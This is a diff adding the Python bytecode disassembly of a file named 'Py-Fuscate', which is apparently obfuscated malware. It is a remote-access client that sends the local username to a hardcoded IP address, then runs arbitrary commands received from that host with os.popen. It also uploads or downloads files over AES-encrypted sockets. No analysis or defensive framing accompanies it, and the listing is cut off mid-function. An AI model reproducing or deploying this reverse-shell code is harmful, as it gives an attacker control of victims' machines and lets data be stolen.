@@ -1,0 +1,1129 @@
+   0           0 RESUME                   0
+
+   1           2 LOAD_CONST               0 (0)
+               4 LOAD_CONST               1 (('popen',))
+               6 IMPORT_NAME              0 (os)
+               8 IMPORT_FROM              1 (popen)
+              10 STORE_NAME               1 (popen)
+              12 POP_TOP
+
+   2          14 NOP
+
+   3          16 NOP
+
+   7     >>   18 LOAD_CONST               0 (0)
+              20 LOAD_CONST               2 (None)
+              22 IMPORT_NAME              2 (socket)
+              24 STORE_NAME               2 (socket)
+
+   8          26 LOAD_CONST               0 (0)
+              28 LOAD_CONST               2 (None)
+              30 IMPORT_NAME              3 (threading)
+              32 STORE_NAME               3 (threading)
+
+   9          34 LOAD_CONST               0 (0)
+              36 LOAD_CONST               2 (None)
+              38 IMPORT_NAME              0 (os)
+              40 STORE_NAME               0 (os)
+
+  10          42 LOAD_CONST               0 (0)
+              44 LOAD_CONST               2 (None)
+              46 IMPORT_NAME              4 (time)
+              48 STORE_NAME               4 (time)
+
+  11          50 LOAD_CONST               0 (0)
+              52 LOAD_CONST               2 (None)
+              54 IMPORT_NAME              5 (random)
+              56 STORE_NAME               5 (random)
+
+  12          58 LOAD_CONST               0 (0)
+              60 LOAD_CONST               2 (None)
+              62 IMPORT_NAME              6 (string)
+              64 STORE_NAME               6 (string)
+
+  13          66 LOAD_CONST               0 (0)
+              68 LOAD_CONST               3 (('AES',))
+              70 IMPORT_NAME              7 (Crypto.Cipher)
+              72 IMPORT_FROM              8 (AES)
+              74 STORE_NAME               8 (AES)
+              76 POP_TOP
+
+  14          78 LOAD_CONST               0 (0)
+              80 LOAD_CONST               4 (('pad', 'unpad'))
+              82 IMPORT_NAME              9 (Crypto.Util.Padding)
+              84 IMPORT_FROM             10 (pad)
+              86 STORE_NAME              10 (pad)
+              88 IMPORT_FROM             11 (unpad)
+              90 STORE_NAME              11 (unpad)
+              92 POP_TOP
+
+  17          94 LOAD_NAME                0 (os)
+              96 LOAD_ATTR                2 (popen)
+             116 PUSH_NULL
+             118 LOAD_CONST               5 ('whoami')
+             120 CALL                     1
+             128 LOAD_ATTR               25 (read + NULL|self)
+             148 CALL                     0
+             156 STORE_NAME              13 (user)
+
+  19         158 LOAD_CONST               6 (4096)
+             160 STORE_NAME              14 (BUFFER_SIZE)
+
+  20         162 LOAD_CONST               7 ('<SEPARATOR>')
+             164 STORE_NAME              15 (SEPARATOR)
+
+  21         166 LOAD_CONST               8 (True)
+             168 STORE_NAME              16 (CONN)
+
+  23         170 LOAD_CONST               9 (<code object enc_mes at 0x7f4923de65b0, file "Py-Fuscate", line 23>)
+             172 MAKE_FUNCTION
+             174 STORE_NAME              17 (enc_mes)
+
+  33         176 LOAD_CONST              10 (<code object dec_file_mes at 0x7f4923ce8e40, file "Py-Fuscate", line 33>)
+             178 MAKE_FUNCTION
+             180 STORE_NAME              18 (dec_file_mes)
+
+  40         182 LOAD_CONST              11 (<code object dec_mes at 0x7f4923e02a60, file "Py-Fuscate", line 40>)
+             184 MAKE_FUNCTION
+             186 STORE_NAME              19 (dec_mes)
+
+  51         188 LOAD_CONST              12 (<code object receive_file at 0x56365cfbb270, file "Py-Fuscate", line 51>)
+             190 MAKE_FUNCTION
+             192 STORE_NAME              20 (receive_file)
+
+  80         194 LOAD_CONST              13 (<code object receive at 0x56365cfdb6a0, file "Py-Fuscate", line 80>)
+             196 MAKE_FUNCTION
+             198 STORE_NAME              21 (receive)
+
+ 163         200 LOAD_NAME               22 (__name__)
+             202 LOAD_CONST              14 ('__main__')
+             204 COMPARE_OP              88 (bool(==))
+             208 POP_JUMP_IF_FALSE      179 (to 570)
+
+ 164         212 NOP
+
+ 165     >>  214 NOP
+
+ 166         216 LOAD_NAME                2 (socket)
+             218 LOAD_ATTR                4 (socket)
+             238 PUSH_NULL
+             240 LOAD_NAME                2 (socket)
+             242 LOAD_ATTR               46 (AF_INET)
+             262 LOAD_NAME                2 (socket)
+             264 LOAD_ATTR               48 (SOCK_STREAM)
+             284 CALL                     2
+             292 STORE_NAME              25 (client)
+
+ 167         294 LOAD_NAME               25 (client)
+             296 LOAD_ATTR               53 (connect + NULL|self)
+             316 LOAD_CONST              15 (('13.61.7.218', 55155))
+             318 CALL                     1
+             326 POP_TOP
+
+ 168         328 LOAD_CONST              16 ('')
+             330 LOAD_ATTR               55 (join + NULL|self)
+             350 LOAD_CONST              17 (<code object <genexpr> at 0x7f4923e07b20, file "Py-Fuscate", line 168>)
+             352 MAKE_FUNCTION
+             354 LOAD_NAME               28 (range)
+             356 PUSH_NULL
+             358 LOAD_CONST              18 (16)
+             360 CALL                     1
+             368 GET_ITER
+             370 CALL                     0
+             378 CALL                     1
+             386 STORE_NAME              29 (k)
+
+ 169         388 LOAD_NAME               25 (client)
+             390 LOAD_ATTR               61 (send + NULL|self)
+             410 LOAD_NAME               13 (user)
+             412 FORMAT_SIMPLE
+             414 LOAD_NAME               15 (SEPARATOR)
+             416 FORMAT_SIMPLE
+             418 LOAD_NAME               29 (k)
+             420 FORMAT_SIMPLE
+             422 BUILD_STRING             3
+             424 LOAD_ATTR               63 (encode + NULL|self)
+             444 CALL                     0
+             452 CALL                     1
+             460 POP_TOP
+
+ 170         462 LOAD_NAME               25 (client)
+             464 LOAD_ATTR               65 (settimeout + NULL|self)
+             484 LOAD_CONST              19 (600)
+             486 CALL                     1
+             494 POP_TOP
+
+ 171         496 NOP
+
+ 174         498 LOAD_NAME                3 (threading)
+             500 LOAD_ATTR               68 (Thread)
+             520 PUSH_NULL
+             522 LOAD_NAME               21 (receive)
+             524 LOAD_NAME               25 (client)
+             526 LOAD_NAME               29 (k)
+             528 BUILD_TUPLE              2
+             530 LOAD_CONST              21 (('target', 'args'))
+             532 CALL_KW                  2
+             534 STORE_NAME              35 (receive_thread)
+
+ 175         536 LOAD_NAME               35 (receive_thread)
+             538 LOAD_ATTR               73 (start + NULL|self)
+             558 CALL                     0
+             566 POP_TOP
+             568 RETURN_CONST             2 (None)
+
+ 163     >>  570 RETURN_CONST             2 (None)
+
+None         572 PUSH_EXC_INFO
+
+   5         574 POP_TOP
+
+   6         576 POP_EXCEPT
+             578 EXTENDED_ARG             1
+             580 JUMP_BACKWARD_NO_INTERRUPT 282 (to 18)
+
+None     >>  582 COPY                     3
+             584 POP_EXCEPT
+             586 RERAISE                  1
+         >>  588 PUSH_EXC_INFO
+
+ 172         590 POP_TOP
+
+ 173         592 LOAD_NAME                4 (time)
+             594 LOAD_ATTR               66 (sleep)
+             614 PUSH_NULL
+             616 LOAD_CONST              20 (50)
+             618 CALL                     1
+             626 POP_TOP
+             628 POP_EXCEPT
+             630 JUMP_FORWARD             3 (to 638)
+
+None     >>  632 COPY                     3
+             634 POP_EXCEPT
+             636 RERAISE                  1
+
+ 164     >>  638 JUMP_BACKWARD          214 (to 214)
+ExceptionTable:
+  216 to 494 -> 588 [0]
+  572 to 574 -> 582 [1] lasti
+  588 to 626 -> 632 [1] lasti
+
+Disassembly of <code object enc_mes at 0x7f4923de65b0, file "Py-Fuscate", line 23>:
+  23           0 RESUME                   0
+
+  24           2 NOP
+
+  25           4 LOAD_GLOBAL              0 (AES)
+              14 LOAD_ATTR                2 (new)
+              34 PUSH_NULL
+              36 LOAD_FAST                1 (key)
+              38 LOAD_ATTR                5 (encode + NULL|self)
+              58 CALL                     0
+              66 LOAD_GLOBAL              0 (AES)
+              76 LOAD_ATTR                6 (MODE_CBC)
+              96 LOAD_FAST                1 (key)
+              98 LOAD_ATTR                5 (encode + NULL|self)
+             118 CALL                     0
+             126 CALL                     3
+             134 STORE_FAST               2 (cypher)
+
+  26         136 LOAD_CONST               1 (16)
+             138 STORE_FAST               3 (cypher_block)
+
+  27         140 LOAD_GLOBAL              9 (type + NULL)
+             150 LOAD_FAST                0 (mes)
+             152 CALL                     1
+             160 LOAD_GLOBAL             10 (bytes)
+             170 COMPARE_OP             119 (bool(!=))
+             174 POP_JUMP_IF_FALSE       16 (to 210)
+
+  28         178 LOAD_FAST                0 (mes)
+             180 LOAD_ATTR                5 (encode + NULL|self)
+             200 CALL                     0
+             208 STORE_FAST               0 (mes)
+
+  29     >>  210 LOAD_FAST                2 (cypher)
+             212 LOAD_ATTR               13 (encrypt + NULL|self)
+             232 LOAD_GLOBAL             15 (pad + NULL)
+             242 LOAD_FAST_LOAD_FAST      3 (mes, cypher_block)
+             244 CALL                     2
+             252 CALL                     1
+             260 RETURN_VALUE
+
+None     >>  262 PUSH_EXC_INFO
+
+  30         264 POP_TOP
+
+  31         266 POP_EXCEPT
+             268 RETURN_CONST             0 (None)
+
+None     >>  270 COPY                     3
+             272 POP_EXCEPT
+             274 RERAISE                  1
+ExceptionTable:
+  4 to 258 -> 262 [0]
+  262 to 264 -> 270 [1] lasti
+
+Disassembly of <code object dec_file_mes at 0x7f4923ce8e40, file "Py-Fuscate", line 33>:
+ 33           0 RESUME                   0
+
+ 34           2 LOAD_GLOBAL              0 (AES)
+             12 LOAD_ATTR                2 (new)
+             32 PUSH_NULL
+             34 LOAD_FAST                1 (key)
+             36 LOAD_ATTR                5 (encode + NULL|self)
+             56 CALL                     0
+             64 LOAD_GLOBAL              0 (AES)
+             74 LOAD_ATTR                6 (MODE_CBC)
+             94 LOAD_FAST                1 (key)
+             96 LOAD_ATTR                5 (encode + NULL|self)
+            116 CALL                     0
+            124 CALL                     3
+            132 STORE_FAST               2 (cypher)
+
+ 35         134 LOAD_CONST               1 (16)
+            136 STORE_FAST               3 (cypher_block)
+
+ 36         138 LOAD_FAST                2 (cypher)
+            140 LOAD_ATTR                9 (decrypt + NULL|self)
+            160 LOAD_FAST                0 (mes)
+            162 CALL                     1
+            170 STORE_FAST               4 (s)
+
+ 38         172 LOAD_GLOBAL             11 (unpad + NULL)
+            182 LOAD_FAST_LOAD_FAST     67 (s, cypher_block)
+            184 CALL                     2
+            192 RETURN_VALUE
+
+Disassembly of <code object dec_mes at 0x7f4923e02a60, file "Py-Fuscate", line 40>:
+  40           0 RESUME                   0
+
+  41           2 LOAD_FAST                0 (mes)
+               4 LOAD_CONST               1 (b'')
+               6 COMPARE_OP              88 (bool(==))
+              10 POP_JUMP_IF_FALSE        2 (to 18)
+
+  42          14 LOAD_FAST                0 (mes)
+              16 RETURN_VALUE
+
+  44     >>   18 NOP
+
+  45          20 LOAD_GLOBAL              0 (AES)
+              30 LOAD_ATTR                2 (new)
+              50 PUSH_NULL
+              52 LOAD_FAST                1 (key)
+              54 LOAD_ATTR                5 (encode + NULL|self)
+              74 CALL                     0
+              82 LOAD_GLOBAL              0 (AES)
+              92 LOAD_ATTR                6 (MODE_CBC)
+             112 LOAD_FAST                1 (key)
+             114 LOAD_ATTR                5 (encode + NULL|self)
+             134 CALL                     0
+             142 CALL                     3
+             150 STORE_FAST               2 (cypher)
+
+  46         152 LOAD_CONST               2 (16)
+             154 STORE_FAST               3 (cypher_block)
+
+  47         156 LOAD_FAST                2 (cypher)
+             158 LOAD_ATTR                9 (decrypt + NULL|self)
+             178 LOAD_FAST                0 (mes)
+             180 CALL                     1
+             188 STORE_FAST               4 (v)
+
+  48         190 LOAD_GLOBAL             11 (unpad + NULL)
+             200 LOAD_FAST_LOAD_FAST     67 (v, cypher_block)
+             202 CALL                     2
+             210 RETURN_VALUE
+
+None     >>  212 PUSH_EXC_INFO
+
+  49         214 POP_TOP
+
+  50         216 POP_EXCEPT
+             218 RETURN_CONST             3 ('echo Try it againg')
+
+None     >>  220 COPY                     3
+             222 POP_EXCEPT
+             224 RERAISE                  1
+ExceptionTable:
+  20 to 208 -> 212 [0]
+  212 to 214 -> 220 [1] lasti
+
+Disassembly of <code object receive_file at 0x56365cfbb270, file "Py-Fuscate", line 51>:
+  51           0 RESUME                   0
+
+  52           2 NOP
+
+  53           4 LOAD_GLOBAL              0 (socket)
+              14 LOAD_ATTR                0 (socket)
+              34 PUSH_NULL
+              36 LOAD_GLOBAL              0 (socket)
+              46 LOAD_ATTR                2 (AF_INET)
+              66 LOAD_GLOBAL              0 (socket)
+              76 LOAD_ATTR                4 (SOCK_STREAM)
+              96 CALL                     2
+             104 STORE_FAST               0 (client2)
+
+  54         106 LOAD_FAST                0 (client2)
+             108 LOAD_ATTR                7 (connect + NULL|self)
+             128 LOAD_CONST               1 (('13.61.7.218', 54163))
+             130 CALL                     1
+             138 POP_TOP
+
+  55         140 LOAD_CONST               2 ('')
+             142 LOAD_ATTR                9 (join + NULL|self)
+             162 LOAD_CONST               3 (<code object <genexpr> at 0x7f4923e07110, file "Py-Fuscate", line 55>)
+             164 MAKE_FUNCTION
+             166 LOAD_GLOBAL             11 (range + NULL)
+             176 LOAD_CONST               4 (16)
+             178 CALL                     1
+             186 GET_ITER
+             188 CALL                     0
+             196 CALL                     1
+             204 STORE_FAST               1 (k)
+
+  56         206 LOAD_FAST                0 (client2)
+             208 LOAD_ATTR               13 (send + NULL|self)
+             228 LOAD_FAST                1 (k)
+             230 LOAD_ATTR               15 (encode + NULL|self)
+             250 CALL                     0
+             258 CALL                     1
+             266 POP_TOP
+
+  57         268 NOP
+
+  58         270 LOAD_FAST                0 (client2)
+             272 LOAD_ATTR               17 (recv + NULL|self)
+             292 LOAD_GLOBAL             18 (BUFFER_SIZE)
+             302 CALL                     1
+             310 STORE_FAST               2 (enc_received)
+
+  59         312 LOAD_GLOBAL             21 (dec_mes + NULL)
+             322 LOAD_FAST_LOAD_FAST     33 (enc_received, k)
+             324 CALL                     2
+             332 LOAD_ATTR               23 (decode + NULL|self)
+             352 CALL                     0
+             360 STORE_FAST               3 (received)
+
+  61         362 LOAD_FAST                3 (received)
+             364 LOAD_ATTR               25 (split + NULL|self)
+             384 LOAD_GLOBAL             26 (SEPARATOR)
+             394 CALL                     1
+             402 UNPACK_SEQUENCE          2
+             406 STORE_FAST_STORE_FAST   69 (filename, filesize)
+
+  63         408 LOAD_GLOBAL             29 (enc_mes + NULL)
+             418 LOAD_CONST               5 ('ok2')
+             420 LOAD_FAST                1 (k)
+             422 CALL                     2
+             430 STORE_FAST               6 (ok_enc)
+
+  64         432 LOAD_FAST                0 (client2)
+             434 LOAD_ATTR               13 (send + NULL|self)
+             454 LOAD_FAST                6 (ok_enc)
+             456 CALL                     1
+             464 POP_TOP
+
+  65         466 LOAD_CONST               6 (0)
+             468 STORE_FAST               7 (total_bytes)
+
+  66         470 LOAD_CONST               7 (b'')
+             472 STORE_FAST               8 (msg)
+
+  67         474 LOAD_FAST                7 (total_bytes)
+             476 LOAD_GLOBAL             31 (int + NULL)
+             486 LOAD_FAST                5 (filesize)
+             488 CALL                     1
+             496 COMPARE_OP              18 (bool(<))
+             500 POP_JUMP_IF_FALSE       56 (to 616)
+
+  68     >>  504 LOAD_FAST                0 (client2)
+             506 LOAD_ATTR               17 (recv + NULL|self)
+             526 LOAD_GLOBAL             18 (BUFFER_SIZE)
+             536 CALL                     1
+             544 STORE_FAST               9 (bytes_read)
+
+  69         546 LOAD_FAST_LOAD_FAST    137 (msg, bytes_read)
+             548 BINARY_OP               13 (+=)
+             552 STORE_FAST               8 (msg)
+
+  70         554 LOAD_FAST                7 (total_bytes)
+             556 LOAD_GLOBAL             33 (len + NULL)
+             566 LOAD_FAST                9 (bytes_read)
+             568 CALL                     1
+             576 BINARY_OP               13 (+=)
+             580 STORE_FAST               7 (total_bytes)
+
+  67         582 LOAD_FAST                7 (total_bytes)
+             584 LOAD_GLOBAL             31 (int + NULL)
+             594 LOAD_FAST                5 (filesize)
+             596 CALL                     1
+             604 COMPARE_OP              18 (bool(<))
+             608 POP_JUMP_IF_FALSE        2 (to 616)
+             612 JUMP_BACKWARD           56 (to 504)
+
+  71     >>  616 LOAD_GLOBAL             21 (dec_mes + NULL)
+             626 LOAD_FAST_LOAD_FAST    129 (msg, k)
+             628 CALL                     2
+             636 STORE_FAST              10 (decr_file)
+
+  72         638 LOAD_GLOBAL             35 (open + NULL)
+             648 LOAD_FAST                4 (filename)
+             650 LOAD_CONST               8 ('wb')
+             652 CALL                     2
+             660 BEFORE_WITH
+             662 STORE_FAST              11 (f)
+
+  73         664 LOAD_FAST               11 (f)
+             666 LOAD_ATTR               37 (write + NULL|self)
+             686 LOAD_FAST               10 (decr_file)
+             688 CALL                     1
+             696 POP_TOP
+
+  72         698 LOAD_CONST               0 (None)
+             700 LOAD_CONST               0 (None)
+             702 LOAD_CONST               0 (None)
+             704 CALL                     2
+             712 POP_TOP
+
+  74     >>  714 NOP
+
+  76         716 LOAD_FAST                0 (client2)
+             718 LOAD_ATTR               39 (close + NULL|self)
+             738 CALL                     0
+             746 POP_TOP
+             748 RETURN_CONST             0 (None)
+
+  72     >>  750 PUSH_EXC_INFO
+             752 WITH_EXCEPT_START
+             754 TO_BOOL
+             762 POP_JUMP_IF_TRUE         1 (to 768)
+             766 RERAISE                  2
+         >>  768 POP_TOP
+             770 POP_EXCEPT
+             772 POP_TOP
+             774 POP_TOP
+             776 JUMP_BACKWARD_NO_INTERRUPT 32 (to 714)
+
+None     >>  778 COPY                     3
+             780 POP_EXCEPT
+             782 RERAISE                  1
+         >>  784 PUSH_EXC_INFO
+
+  77         786 POP_TOP
+
+  78         788 LOAD_FAST_CHECK          0 (client2)
+             790 LOAD_ATTR               13 (send + NULL|self)
+             810 LOAD_CONST               9 ('Error transporting file')
+             812 LOAD_ATTR               15 (encode + NULL|self)
+             832 CALL                     0
+             840 CALL                     1
+             848 POP_TOP
+             850 POP_EXCEPT
+             852 RETURN_CONST             0 (None)
+
+None     >>  854 COPY                     3
+             856 POP_EXCEPT
+             858 RERAISE                  1
+ExceptionTable:
+  4 to 610 -> 784 [0]
+  616 to 660 -> 784 [0]
+  662 to 696 -> 750 [1] lasti
+  698 to 746 -> 784 [0]
+  750 to 768 -> 778 [3] lasti
+  770 to 782 -> 784 [0]
+  784 to 848 -> 854 [1] lasti
+
+Disassembly of <code object <genexpr> at 0x7f4923e07110, file "Py-Fuscate", line 55>:
+  55           0 RETURN_GENERATOR
+               2 POP_TOP
+               4 RESUME                   0
+               6 LOAD_FAST                0 (.0)
+               8 GET_ITER
+         >>   10 FOR_ITER                72 (to 158)
+              14 STORE_FAST               1 (_)
+              16 LOAD_GLOBAL              0 (random)
+              26 LOAD_ATTR                2 (SystemRandom)
+              46 PUSH_NULL
+              48 CALL                     0
+              56 LOAD_ATTR                5 (choice + NULL|self)
+              76 LOAD_GLOBAL              6 (string)
+              86 LOAD_ATTR                8 (ascii_letters)
+             106 LOAD_GLOBAL              6 (string)
+             116 LOAD_ATTR               10 (digits)
+             136 BINARY_OP                0 (+)
+             140 CALL                     1
+             148 YIELD_VALUE              0
+             150 RESUME                   5
+             152 POP_TOP
+             154 JUMP_BACKWARD           74 (to 10)
+         >>  158 END_FOR
+             160 POP_TOP
+             162 RETURN_CONST             0 (None)
+
+None     >>  164 CALL_INTRINSIC_1         3 (INTRINSIC_STOPITERATION_ERROR)
+             166 RERAISE                  1
+ExceptionTable:
+  4 to 162 -> 164 [0] lasti
+
+Disassembly of <code object receive at 0x56365cfdb6a0, file "Py-Fuscate", line 80>:
+  80           0 RESUME                   0
+
+  81           2 NOP
+
+  82     >>    4 NOP
+
+  83           6 LOAD_CONST               0 (None)
+               8 STORE_FAST               2 (message)
+
+  84          10 LOAD_FAST                0 (client)
+              12 LOAD_ATTR                1 (recv + NULL|self)
+              32 LOAD_CONST               1 (1024)
+              34 CALL                     1
+              42 STORE_FAST               3 (msg)
+
+  85          44 LOAD_GLOBAL              3 (dec_mes + NULL)
+              54 LOAD_FAST_LOAD_FAST     49 (msg, k)
+              56 CALL                     2
+              64 STORE_FAST               3 (msg)
+
+  86          66 LOAD_FAST                3 (msg)
+              68 LOAD_ATTR                5 (decode + NULL|self)
+              88 CALL                     0
+              96 STORE_FAST               2 (message)
+
+  87          98 LOAD_FAST                3 (msg)
+             100 LOAD_CONST               2 (b'')
+             102 COMPARE_OP              88 (bool(==))
+             106 POP_JUMP_IF_FALSE       79 (to 268)
+
+  88         110 LOAD_GLOBAL              6 (time)
+             120 LOAD_ATTR                8 (sleep)
+             140 PUSH_NULL
+             142 LOAD_CONST               3 (10)
+             144 CALL                     1
+             152 POP_TOP
+
+  89         154 LOAD_CONST               4 (0)
+             156 STORE_FAST               4 (s)
+
+  90         158 LOAD_FAST                3 (msg)
+             160 LOAD_CONST               2 (b'')
+             162 COMPARE_OP              88 (bool(==))
+             166 POP_JUMP_IF_FALSE       47 (to 264)
+
+  91     >>  170 LOAD_FAST                4 (s)
+             172 LOAD_CONST               5 (1)
+             174 BINARY_OP               13 (+=)
+             178 STORE_FAST               4 (s)
+
+  92         180 LOAD_FAST                0 (client)
+             182 LOAD_ATTR                1 (recv + NULL|self)
+             202 LOAD_CONST               1 (1024)
+             204 CALL                     1
+             212 STORE_FAST               3 (msg)
+
+  93         214 LOAD_FAST                4 (s)
+             216 LOAD_CONST               6 (300)
+             218 COMPARE_OP              88 (bool(==))
+             222 POP_JUMP_IF_FALSE       11 (to 248)
+
+  94         226 LOAD_GLOBAL             11 (Exception + NULL)
+             236 LOAD_CONST               7 ('Reconnect!')
+             238 CALL                     1
+             246 RAISE_VARARGS            1
+
+  90     >>  248 LOAD_FAST                3 (msg)
+             250 LOAD_CONST               2 (b'')
+             252 COMPARE_OP              88 (bool(==))
+             256 POP_JUMP_IF_FALSE        2 (to 264)
+             260 JUMP_BACKWARD           47 (to 170)
+
+None     >>  264 EXTENDED_ARG             1
+             266 JUMP_FORWARD           510 (to 1288)
+
+  95     >>  268 LOAD_FAST                2 (message)
+             270 LOAD_CONST               8 ('check')
+             272 COMPARE_OP              88 (bool(==))
+             276 POP_JUMP_IF_FALSE       31 (to 342)
+
+  96         280 LOAD_GLOBAL             13 (enc_mes + NULL)
+             290 LOAD_CONST               9 ('check-ok')
+             292 LOAD_FAST                1 (k)
+             294 CALL                     2
+             302 STORE_FAST               5 (enc_answ)
+
+  97         304 LOAD_FAST                0 (client)
+             306 LOAD_ATTR               15 (send + NULL|self)
+             326 LOAD_FAST                5 (enc_answ)
+             328 CALL                     1
+             336 POP_TOP
+             338 EXTENDED_ARG             1
+             340 JUMP_FORWARD           473 (to 1288)
+
+  98     >>  342 LOAD_FAST                2 (message)
+             344 LOAD_CONST              10 ('send_file')
+             346 COMPARE_OP              88 (bool(==))
+             350 POP_JUMP_IF_FALSE       42 (to 438)
+
+  99         354 LOAD_GLOBAL             16 (threading)
+             364 LOAD_ATTR               18 (Thread)
+             384 PUSH_NULL
+             386 LOAD_GLOBAL             20 (receive_file)
+             396 LOAD_CONST              11 (('target',))
+             398 CALL_KW                  1
+             400 STORE_FAST               6 (receive_file_thread)
+
+ 100         402 LOAD_FAST                6 (receive_file_thread)
+             404 LOAD_ATTR               23 (start + NULL|self)
+             424 CALL                     0
+             432 POP_TOP
+             434 EXTENDED_ARG             1
+             436 JUMP_FORWARD           425 (to 1288)
+
+ 101     >>  438 LOAD_FAST                2 (message)
+             440 LOAD_CONST              12 ('get_file')
+             442 COMPARE_OP              88 (bool(==))
+             446 POP_JUMP_IF_FALSE      195 (to 840)
+
+ 102         450 LOAD_GLOBAL             13 (enc_mes + NULL)
+             460 LOAD_CONST              13 ('ok')
+             462 LOAD_FAST                1 (k)
+             464 CALL                     2
+             472 STORE_FAST               7 (okenc)
+
+ 103         474 LOAD_FAST                0 (client)
+             476 LOAD_ATTR               15 (send + NULL|self)
+             496 LOAD_FAST                7 (okenc)
+             498 CALL                     1
+             506 POP_TOP
+
+ 104         508 NOP
+
+ 105         510 NOP
+
+ 106         512 LOAD_FAST                0 (client)
+             514 LOAD_ATTR                1 (recv + NULL|self)
+             534 LOAD_CONST               1 (1024)
+             536 CALL                     1
+             544 STORE_FAST               8 (path_to_file)
+
+ 107         546 LOAD_GLOBAL              3 (dec_mes + NULL)
+             556 LOAD_FAST_LOAD_FAST    129 (path_to_file, k)
+             558 CALL                     2
+             566 STORE_FAST               8 (path_to_file)
+
+ 110         568 LOAD_GLOBAL             25 (open + NULL)
+             578 LOAD_FAST                8 (path_to_file)
+             580 LOAD_CONST              14 ('rb')
+             582 CALL                     2
+             590 BEFORE_WITH
+             592 STORE_FAST               9 (f)
+
+ 111         594 LOAD_FAST                9 (f)
+             596 LOAD_ATTR               27 (read + NULL|self)
+             616 CALL                     0
+             624 STORE_FAST              10 (bytes_read)
+
+ 110         626 LOAD_CONST               0 (None)
+             628 LOAD_CONST               0 (None)
+             630 LOAD_CONST               0 (None)
+             632 CALL                     2
+             640 POP_TOP
+
+ 112     >>  642 LOAD_GLOBAL             13 (enc_mes + NULL)
+             652 LOAD_FAST_CHECK         10 (bytes_read)
+             654 LOAD_FAST                1 (k)
+             656 CALL                     2
+             664 STORE_FAST              11 (bytes_enc)
+
+ 113         666 LOAD_GLOBAL             29 (len + NULL)
+             676 LOAD_FAST               11 (bytes_enc)
+             678 CALL                     1
+             686 STORE_FAST              12 (filesize)
+
+ 115         688 LOAD_GLOBAL             13 (enc_mes + NULL)
+             698 LOAD_FAST               12 (filesize)
+             700 FORMAT_SIMPLE
+             702 LOAD_FAST                1 (k)
+             704 CALL                     2
+             712 STORE_FAST              12 (filesize)
+
+ 117         714 LOAD_FAST                0 (client)
+             716 LOAD_ATTR               15 (send + NULL|self)
+             736 LOAD_FAST               12 (filesize)
+             738 CALL                     1
+             746 POP_TOP
+
+ 119         748 LOAD_FAST                0 (client)
+             750 LOAD_ATTR                1 (recv + NULL|self)
+             770 LOAD_CONST               1 (1024)
+             772 CALL                     1
+             780 STORE_FAST              13 (vsb)
+
+ 120         782 LOAD_GLOBAL              3 (dec_mes + NULL)
+             792 LOAD_FAST_LOAD_FAST    209 (vsb, k)
+             794 CALL                     2
+             802 STORE_FAST              13 (vsb)
+
+ 122         804 LOAD_FAST                0 (client)
+             806 LOAD_ATTR               31 (sendall + NULL|self)
+             826 LOAD_FAST               11 (bytes_enc)
+             828 CALL                     1
+             836 POP_TOP
+
+ 123         838 JUMP_FORWARD           224 (to 1288)
+
+ 131     >>  840 LOAD_FAST                2 (message)
+             842 LOAD_CONST               0 (None)
+             844 COMPARE_OP             119 (bool(!=))
+             848 POP_JUMP_IF_FALSE      218 (to 1288)
+             852 LOAD_FAST                2 (message)
+             854 LOAD_CONST              17 ('')
+             856 COMPARE_OP             119 (bool(!=))
+             860 POP_JUMP_IF_FALSE      212 (to 1288)
+             864 LOAD_FAST                2 (message)
+             866 LOAD_CONST              18 ('\n')
+             868 COMPARE_OP             119 (bool(!=))
+             872 POP_JUMP_IF_FALSE      206 (to 1288)
+
+ 132         876 NOP
+
+ 133         878 LOAD_GLOBAL             34 (os)
+             888 LOAD_ATTR               36 (popen)
+             908 PUSH_NULL
+             910 LOAD_FAST                2 (message)
+             912 CALL                     1
+             920 LOAD_ATTR               27 (read + NULL|self)
+             940 CALL                     0
+             948 STORE_FAST              14 (answer)
+
+ 135         950 LOAD_FAST               14 (answer)
+             952 LOAD_ATTR               33 (encode + NULL|self)
+             972 CALL                     0
+             980 LOAD_CONST               2 (b'')
+             982 COMPARE_OP              88 (bool(==))
+             986 POP_JUMP_IF_FALSE       33 (to 1056)
+
+ 136         990 LOAD_FAST                0 (client)
+             992 LOAD_ATTR               15 (send + NULL|self)
+            1012 LOAD_CONST              19 ('Bad command!')
+            1014 LOAD_ATTR               33 (encode + NULL|self)
+            1034 LOAD_CONST              20 ('ascii')
+            1036 CALL                     1
+            1044 CALL                     1
+            1052 POP_TOP
+            1054 JUMP_FORWARD           116 (to 1288)
+
+ 138     >> 1056 LOAD_GLOBAL             13 (enc_mes + NULL)
+            1066 LOAD_FAST_LOAD_FAST    225 (answer, k)
+            1068 CALL                     2
+            1076 STORE_FAST              15 (enc_answer)
+
+ 139        1078 LOAD_GLOBAL             39 (str + NULL)
+            1088 LOAD_GLOBAL             29 (len + NULL)
+            1098 LOAD_FAST               15 (enc_answer)
+            1100 CALL                     1
+            1108 CALL                     1
+            1116 STORE_FAST              16 (size)
+
+ 140        1118 LOAD_FAST                0 (client)
+            1120 LOAD_ATTR               15 (send + NULL|self)
+            1140 LOAD_FAST               16 (size)
+            1142 LOAD_ATTR               33 (encode + NULL|self)
+            1162 CALL                     0
+            1170 CALL                     1
+            1178 POP_TOP
+
+ 141        1180 LOAD_FAST                0 (client)
+            1182 LOAD_ATTR                1 (recv + NULL|self)
+            1202 LOAD_CONST               1 (1024)
+            1204 CALL                     1
+            1212 LOAD_ATTR                5 (decode + NULL|self)
+            1232 CALL                     0
+            1240 STORE_FAST              17 (ch)
+
+ 142        1242 LOAD_FAST               17 (ch)
+            1244 LOAD_CONST              13 ('ok')
+            1246 COMPARE_OP              88 (bool(==))
+            1250 POP_JUMP_IF_FALSE       17 (to 1288)
+
+ 143        1254 LOAD_FAST                0 (client)
+            1256 LOAD_ATTR               31 (sendall + NULL|self)
+            1276 LOAD_FAST               15 (enc_answer)
+            1278 CALL                     1
+            1286 POP_TOP
+
+  81     >> 1288 EXTENDED_ARG             2
+            1290 JUMP_BACKWARD          645 (to 4)
+
+ 110     >> 1294 PUSH_EXC_INFO
+            1296 WITH_EXCEPT_START
+            1298 TO_BOOL
+            1306 POP_JUMP_IF_TRUE         1 (to 1312)
+            1310 RERAISE                  2
+         >> 1312 POP_TOP
+            1314 POP_EXCEPT
+            1316 POP_TOP
+            1318 POP_TOP
+            1320 EXTENDED_ARG             1
+            1322 JUMP_BACKWARD_NO_INTERRUPT 341 (to 642)
+
+None     >> 1324 COPY                     3
+            1326 POP_EXCEPT
+            1328 RERAISE                  1
+         >> 1330 PUSH_EXC_INFO
+
+ 124        1332 POP_TOP
+
+ 125        1334 NOP
+
+ 126        1336 LOAD_FAST                0 (client)
+            1338 LOAD_ATTR               15 (send + NULL|self)
+            1358 LOAD_CONST              15 ('Error uploading file')
